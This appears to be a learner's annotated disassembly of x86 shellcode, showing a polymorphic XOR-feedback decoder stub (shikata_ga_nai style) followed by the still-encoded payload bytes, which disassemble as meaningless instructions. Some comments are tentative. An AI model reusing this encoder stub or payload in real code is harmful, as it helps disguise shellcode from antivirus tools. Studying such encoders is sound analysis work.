global _start:

section .text

_start:

fldl2t                      ; push log2 10 onto the FPU register stack
mov edx,0x787ed433          ; Load into EDX the value 0x787ed433
fnstenv [esp-0xc]           ; Save the current FPU environment 12 bytes ahead of the stack pointer. This results in the FPU instruction pointer being saved where ESP is pointing to.
pop ebp                     ; pop the FPU IP into the base pointer. I think this makes sure nothing we push to the stack overwrites the decoder or encoded shellcode. 
sub ecx,ecx                 ; zero ecx
mov cl,0xd                  ; set ecx to 0x0000000d
xor [ebp+0x1a],edx          ; EBP currently points to _start, this XOR's _start + 26 with EDX
sub ebp,byte -0x4           ; Move the base pointer four bytes up the stack
add edx,[ebp+0x16]          ; add to EDX the data at the base pointer plus 22 (the four decoded bytes before ththe next bytes to decode)
loop 0xffffffe1             ; dec ecx and jmp short to _start+16 (xor [ebp+0x1a], edx)
mov esi,0x6db12075          ; start of encoded payload, when the loop is not taken execution continues here.
in al,dx
mov eax,0xdf79f2ec
xchg bl,bl
or cl,[eax+0x56]
dec esp
ret 0x3fea
loop 0xffffffc6
or ch,ch
adc dh,[ebp-0x2a1cee32]
scasd
gs ret
ss push ebp
int1
pusha
in ax,0x98
adc eax,0xda3e720b
mov esp,0x8f3b372f
push eax

